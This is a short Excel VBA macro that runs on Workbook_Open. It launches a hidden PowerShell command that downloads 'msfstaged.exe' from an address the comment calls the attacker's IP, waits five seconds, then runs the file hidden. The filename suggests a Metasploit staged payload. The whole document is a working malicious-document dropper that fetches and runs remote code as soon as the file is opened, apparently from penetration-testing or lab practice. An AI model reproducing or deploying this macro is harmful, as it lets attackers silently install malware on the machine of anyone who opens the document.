Private Sub Workbook_Open()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.195/msfstaged.exe', 'msfstaged.exe')" ' Set to attacker's IP
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveWorkbook.Path + "\msfstaged.exe"
    Wait (5)
    Shell exePath, vbHide
    
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
